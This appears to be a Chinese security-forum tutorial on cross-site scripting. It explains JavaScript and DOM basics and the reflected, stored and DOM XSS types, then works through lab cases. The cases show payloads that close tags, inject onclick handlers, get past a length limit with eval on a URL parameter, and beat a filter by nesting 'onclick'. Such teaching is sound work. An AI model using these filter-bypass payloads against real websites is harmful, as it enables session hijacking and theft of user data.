
# [原创]漏洞挖掘_前端漏洞：xss

[toc]

## 备注

会不定时扩充与完善文章内容

更新日期：2020年12月24日

## 知识储备

### JavaScript

`JavaScript` 是属于 `HTML` 和 `Web` 的编程语言。

`JavaScript` 能够改变 `HTML` 内容。

**案例：**

`JavaScript` 能够改变 `HTML` 属性

本例通过改变 `<img>` 标签的 `src` 属性（source）来改变一张 `HTML` 图像：

```
<!DOCTYPE html>
<html>
<body>
<h2>JavaScript 能做什么？</h2>
<p>JavaScript 能够改变 HTML 属性值。</p>
<p>在本例中，JavaScript 改变了图像的 src 属性值。</p>
<button onclick="document.getElementById('myImage').src='/i/eg_bulbon.gif'">开灯</button>
<img id="myImage" border="0" src="/i/eg_bulboff.gif" style="text-align:center;">
<button onclick="document.getElementById('myImage').src='/i/eg_bulboff.gif'">关灯</button>
</body>
</html>
```

![](upload/attach/202012/767964_HGXJ9H4N5NN74CN.gif)

### JavaScript HTML DOM

通过 `HTML DOM`，`JavaScript` 能够访问和改变 `HTML` 文档的所有元素。

**HTML DOM（文档对象模型）**

当网页被加载时，浏览器会创建页面的文档对象模型（Document Object Model）。

`HTML DOM` 模型被结构化为对象树：

对象的 `HTML DOM` 树

![图片描述](upload/attach/202012/767964_44YS3WNWVEPCB7H.png)

通过这个对象模型，`JavaScript` 获得创建动态 `HTML` 的所有力量：

* `JavaScript` 能改变页面中的所有 `HTML` 元素
* `JavaScript` 能改变页面中的所有 `HTML` 属性
* `JavaScript` 能改变页面中的所有 `CSS` 样式
* `JavaScript` 能删除已有的 `HTML` 元素和属性
* `JavaScript` 能添加新的 `HTML` 元素和属性
* `JavaScript` 能对页面中所有已有的 `HTML` 事件作出反应
* `JavaScript` 能在页面中创建新的 `HTML` 事件

`HTML DOM` 是 `HTML` 的标准对象模型和编程接口,它定义了：

* 作为对象的 `HTML` 元素
* 所有 `HTML` 元素的属性
* 访问所有 `HTML` 元素的方法
* 所有 `HTML` 元素的事件

换言之：`HTML DOM` 是关于如何获取、更改、添加或删除 `HTML` 元素的标准。

### HTML DOM Event 对象

**HTML DOM Document 对象**

```
每个载入浏览器的 HTML 文档都会成为 Document 对象。
Document 对象使我们可以从脚本中对 HTML 页面中的所有元素进行访问。
```

**HTML DOM Element 对象**

```
在 HTML DOM 中，Element 对象表示 HTML 元素。
Element 对象可以拥有类型为元素节点、文本节点、注释节点的子节点。
NodeList 对象表示节点列表，比如 HTML 元素的子节点集合。
```

**HTML DOM Attribute 对象**

```
在 HTML DOM 中，Attr 对象表示 HTML 属性。
HTML 属性始终属于 HTML 元素。
```

**HTML DOM Event 对象**

```
Event 对象代表事件的状态，比如事件在其中发生的元素、键盘按键的状态、鼠标的位置、鼠标按钮的状态。
事件通常与函数结合使用，函数不会在事件发生前被执行！
```

### 其它前端知识

学无止境

# xss漏洞简介

* 跨站脚本（Cross-Site Scripting，XSS）是一种经常出现在Web应用程序中的计算机安全漏洞，是由于Web应用程序对用户的输入过滤不足而产生的。
* 攻击者利用网站漏洞把恶意的脚本代码（通常包括HTML代码和客户端Javascript脚本）注入到网页之中，当其他用户浏览这些网页时，就会执行其中的恶意代码，对受害用户可能采取Cookie资料窃取、会话劫持、钓鱼欺骗等各种攻击。
* 由于和另一种网页技术——层叠样式表（Cascading Style Sheets，CSS）的缩写一样，为了防止混淆，故把原本的CSS简称为XSS。通常情况下，我们既可以把跨站脚本理解成一种Web安全漏洞，也可以理解成一种攻击手段。
* XSS跨站脚本攻击本身对Web服务器没有直接危害，它借助网站进行传播，使网站的大量用户受到攻击。攻击者一般通过留言、电子邮件或其他途径向受害者发送一个精心构造的恶意URL，当受害者在Web浏览器中打开该URL的时侯，恶意脚本会在受害者的计算机上悄悄执行，其流程如图所示：

![图片描述](upload/attach/202012/767964_JZVPYJ9UTBUY6PS.png)

**未便于理解进行了分类归纳：**

* 反射型XSS（也叫非持久型XSS）

```
发出请求时，XSS代码出现在URL中，作为输入提交到服务端，服务端解析后响应，在响应内容中出现这段XSS代码，最后浏览器解析执行。这个过程就像一次反射，故称为反射型XSS。
```

* 存储型XSS（也叫持久型XSS）

```
存储型XSS和反射型XSS的差别仅在于：提交的XSS代码会存储在服务端（不管是数据库、内存还是文件系统等），下次请求目标页面时不用再提交XSS代码。
```

* DOM XSS

```
DOM XSS的XSS代码并不需要服务器解析响应的直接参与，触发XSS靠的就是浏览器端的DOM解析，可以认为完全是客户端的事情。
```

**常见危害例举**

挂马

* 盗取用户Cookie
* DoS（拒绝服务）客户端浏览器
* 钓鱼攻击，高级钓鱼技巧
* 编写针对性的XSS病毒
* 删除目标文章
* 恶意篡改数据、嫁祸、“借刀杀人”
* 劫持用户Web行为，甚至进一步渗透内网
* 蠕虫攻击
* 蠕虫式挂马攻击、刷广告、刷流量、破坏网上数据......

# 实战

通过案例进行讲解

## 利用本地存储功能

在使用搜索功能时发现信息存在"驻留"现象

![图片描述](upload/attach/202012/767964_VC2R3WN4PSGVJZQ.png)

* 打开浏览器调试工具分析

**元素**

![图片描述](upload/attach/202012/767964_EYD4UM6EBZB85Z6.png)

**查看js代码**

![图片描述](upload/attach/202012/767964_CXGZJDM4J8APTWS.png)

```
$('.search-ipt').on('input',function () {
let val=localStorage.getItem('record')||''
if (val!=''){
$('.history').css('display','block')
$('.history').html('<a href="/?search='+val+'">'+val+'</a>')
}else{
$('.history').css('display','none')
}
})
$('.search-btn').click(function () {
let val = $('.search-ipt').val()
localStorage.setItem('record',val)
}
)
发现将数据存储在localStorage
```

![图片描述](upload/attach/202012/767964_ZD7US598K93QV9F.png)

* 输入js语句进行xss测试

```
<script>alert("xss测试")</script>
```

![图片描述](upload/attach/202012/767964_54GE96P64MZ92CG.png)

* 搜索执行查看

再次搜索成功调用并按js执行了所输入内容

![图片描述](upload/attach/202012/767964_Z9DHVS7M9FWQB9G.png)

## 简单闭合标签逃逸

![图片描述](upload/attach/202012/767964_R9MRDY6EJ8HAJJG.png)

发现输入的数据有驻留但在标签内

* 查看js

![图片描述](upload/attach/202012/767964_QY8JSRNZ6C6ZVQ5.png)

```
$('.search-ipt').on('input',function () {
if ($('.search-ipt').val()==''){
$('.history').css('display','none')
}
else {
$('.history').css('display','block')
}
let val = $('.search-ipt').val()
$('.history').html('<a href="/?search='+val+'">暂无搜索结果</a>')
})
发现取内容放在<a标签内
```

* 输入测试

![图片描述](upload/attach/202012/767964_UXE2CUEWFME2H6V.png)

* 输入特殊字符闭合标签

闭合成功，输入内容以js代码形式执行

![图片描述](upload/attach/202012/767964_49RP4P2BHS8CVJN.png)

**分析：**

输入`>` 闭合了标签`<a` 并使之后的数据可不在标签内显示

![图片描述](upload/attach/202012/767964_R6553VTX6GUT6V4.png)

## 添加事件进行逃逸

正常测试，查看元素

![图片描述](upload/attach/202012/767964_UA4VB3P95ZHH6XH.png)

* 查看js

![图片描述](upload/attach/202012/767964_95MCTZB3RB7YVZB.png)

```
$('.url-btn').click(function () {
let val = $('.search-ipt').val()
if (val == '') {
$('.url-box').css('display', 'none')
} else {
val = val.toLocaleLowerCase().replace(/script/g,'').replace(/</g,'').replace(/>/g,'')
$('.url-box').css('display', 'block')
$('.url-box').html('<span style="padding-left: 2px">生成的链接为：<a class="url" href="'+val+'">'+val+'</a></span>')
}
}
)
发现将数据存储在<a标签href属性内
```

* 闭合并添加事件

![图片描述](upload/attach/202012/767964_RRNSSU95Y3K2SFY.png)

分析：

需闭合标签并逃逸herf属性

```
<a> 标签的 href 属性用于指定超链接目标的 URL。
href 属性的值可以是任何有效文档的相对或绝对 URL，包括片段标识符和 JavaScript 代码段。如果用户选择了 <a> 标签中的内容，那么浏览器会尝试检索并显示 href 属性指定的 URL 所表示的文档，或者执行 JavaScript 表达式、方法和函数的列表。
```

HTML DOM Event 对象

```
Event 对象代表事件的状态，比如事件在其中发生的元素、键盘按键的状态、鼠标的位置、鼠标按钮的状态。
```

事件句柄　(Event Handlers)

```
HTML 4.0 的新特性之一是能够使 HTML 事件触发浏览器中的行为，比如当用户点击某个 HTML 元素时启动一段 JavaScript。下面是一个属性列表，可将之插入 HTML 标签以定义事件的行为。
```

![图片描述](upload/attach/202012/767964_PPJK4QVDGVXXS6C.png)

事件通常与函数结合使用，函数不会在事件发生前被执行！

`onmouseover` 事件会在鼠标指针移动到指定的对象上时发生

```
支持该事件的 HTML 标签：
<a>, <address>, <area>, <b>, <bdo>, <big>, <blockquote>, <body>, <button>,
<caption>, <cite>, <code>, <dd>, <dfn>, <div>, <dl>, <dt>, <em>, <fieldset>,
<form>, <h1> to <h6>, <hr>, <i>, <img>, <input>, <kbd>, <label>, <legend>,
<li>, <map>, <ol>, <p>, <pre>, <samp>, <select>, <small>, <span>, <strong>,
<sub>, <sup>, <table>, <tbody>, <td>, <textarea>, <tfoot>, <th>, <thead>,
<tr>, <tt>, <ul>, <var>
```

![](upload/attach/202012/767964_MTPGZMYE3PEFZ33.gif)

## 打破长度

* 输入测试

```
"><script>alert(1)</script>
```

![图片描述](upload/attach/202012/767964_KQP3A6X835TTUDQ.png)

测试发现输入内容被过滤

换测试代码

```
" onclick="alert(1)
```

![图片描述](upload/attach/202012/767964_MFZJ2MBQNCXSAHU.png)

未过滤但未成功闭合

* 查看代码

![图片描述](upload/attach/202012/767964_RZSKVBBTU7U9T5K.png)

事件没有完全闭合后面(多了:content）

*"闭合测试

![图片描述](upload/attach/202012/767964_6WK3NSS95KZHQJ9.png)

* 深入测试

![图片描述](upload/attach/202012/767964_8TACYWSK2MFKACS.png)

发现对代码输入的长度进行了限制

* 分析前端代码

![图片描述](upload/attach/202012/767964_XUFFC3NSPY3MXUF.png)

```
let query = getParam('query')||''
if (query){
query=query.replace(/<|>|script/g,'').substring(0, 33)
看到使用了query参数，其值为getParam('query')
```

* getparam()函数分析

![图片描述](upload/attach/202012/767964_JWHY9AT7QMSEGPE.png)

```
function getParam(name) {
if (location.search!=''){
let param = new URLSearchParams(location.search)
return decodeURI(param.get(name))
}
若链接中存在参数，则创建一个对象，值为所有参数，name对应参数名
```

* 测试

```
"%20onclick="eval(getParam(Test))"&Test=其它代码
```

![图片描述](upload/attach/202012/767964_Y26WDG3H673GWEE.png)

成功引用。已打破输入长度限制

## 拼接绕过

* 测试

```
"" onclonclickick="alert(1)"
```

![](upload/attach/202012/767964_X64RVDA33J94PSV.png)

被过滤，发现onclick被过滤成立空字符

* 拼接

```
"" onclonclickick="alert(1)"
```

过滤一个在加一个

![图片描述](upload/attach/202012/767964_2K56UU8XAAZ7CBG.png)

测试成功

# 参考资料

* 《JavaScript 教程》
* 《Web前端黑客技术揭秘》
* 《XSS跨站脚本攻击剖析与防御》

目录

- [备注](https://bbs.kanxue.com/#备注)
- [知识储备](https://bbs.kanxue.com/#知识储备)
- [JavaScript](https://bbs.kanxue.com/#javascript)
- JavaScript HTML DOM
- HTML DOM Event 对象
- [其它前端知识](https://bbs.kanxue.com/#其它前端知识)
- [xss漏洞简介](https://bbs.kanxue.com/#xss漏洞简介)
- [实战](https://bbs.kanxue.com/#实战)
- [利用本地存储功能](https://bbs.kanxue.com/#利用本地存储功能)
- [简单闭合标签逃逸](https://bbs.kanxue.com/#简单闭合标签逃逸)
